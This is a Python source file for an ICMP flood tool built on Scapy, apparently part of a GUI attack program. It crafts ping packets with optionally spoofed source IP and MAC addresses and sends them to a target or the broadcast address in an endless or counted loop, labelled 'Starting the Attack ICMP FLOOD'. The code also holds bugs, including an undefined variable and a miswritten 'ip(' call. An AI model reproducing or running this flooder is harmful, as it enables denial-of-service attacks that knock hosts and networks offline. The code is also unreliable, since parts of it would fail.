import time
import random
import threading
from scapy.all import *
import icmp_flood_graphique
import sys

class icmp_flood(threading.Thread):

	def __init__(self,ip_dst,mac_dst,ip_src1,mac_src1,nombre,attente,interface,data):
		
		threading.Thread.__init__(self)
		self.stopper=threading.Event()
				
		self.ip_dst=ip_dst
		self.mac_dst=mac_dst
		self.mac_src1=mac_src1


		##TEST DE L'INTERFACE D'ENVOI
		if(interface != ""):
			print("interface not chosen automatically")
			conf.iface=interface
		else:
			print("interface chosen automatically")
		

		if(interface != ""):
			print("PACKETS SENDING INTERFACE:"+interface)
		else:
			print("PACKETS SENDING INTERFACE:"+conf.iface)



		if(mac_dst == "" and mac_src1==""):

			if(ip_dst==""):

				if(ip_src1==""):

					self.ip=IP(dst="255.255.255.255")
	
				else:
					self.ip=IP(src=ip_src1,dst="255.255.255.255")


			else:

				if(ip_src1==""):

					self.ip=IP(dst=ip_dst)
	
				else:
					self.ip=IP(src=ip_src1,dst=ip_dst)
				

			
		else:
			
			
			if(ip_dst==""):

				if(ip_src==""):

					self.ip=IP(dst="255.255.255.255")
	
				else:
					self.ip=IP(src=ip_src1,dst="255.255.255.255")


			else:

				if(ip_src==""):

					self.ip=IP(dst=ip_dst)
	
				else:
					self.ip=ip(src=ip_src1,dst=ip_dst)


			if(mac_dst=="" and mac_src1!=""):
				self.ether=Ether(src=mac_src1)
			elif (mac_dst!="" and mac_src1==""):
				self.ether=Ether(dst=mac_dst)
			else:
				self.ether=Ether(src=mac_src1,dst=mac_dst)

		


		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)
		
		self.payload="A"*data

	def run(self):	
		
		if(icmp_flood_graphique.verrou.locked()):
			print("\n ERROR ANOTHER ATTACK IN PROGRESS DETECTED")
		else:
			print("\n NO ATTACK IN PROGRESS DETECTED\n")

			icmp_flood_graphique.verrou.acquire()
	
			
			self.ip.show()
		
			time.sleep(3)

			print("\n Starting the Attack ICMP FLOOD --"+time.ctime()+"\n")
			
			

			if(self.mac_dst=="" and self.mac_src1==""):	

				if(self.n == -1):
					while(1==1 and not(self.stopper.isSet())):
		
						'''CREATION DU PAQUET'''
						self.ping=(self.ip/ICMP()/self.payload)
					
						send(self.ping)
						time.sleep(self.delai)
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
		
						'''CREATION DU PAQUET'''
						self.ping=(self.ip/ICMP()/self.payload)
						send(self.ping)
						time.sleep(self.delai)
						if(self.stopper.isSet()):
							break
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
			else:

				self.ether.show()

				if(self.n == -1):
					while(1==1 and not(self.stopper.isSet())):
		
						'''CREATION DU PAQUET'''
						self.ping=(self.ether/self.ip/ICMP()/self.payload)
					
						sendp(self.ping)
						time.sleep(self.delai)
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
		
						'''CREATION DU PAQUET'''
						self.ping=(self.ether/self.ip/ICMP()/self.payload)
						send(self.ping)
						time.sleep(self.delai)
						if(self.stopper.isSet()):
							break
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")

			icmp_flood_graphique.verrou.release()

	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		self.stopper.set()
	
	def randommac(self):
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
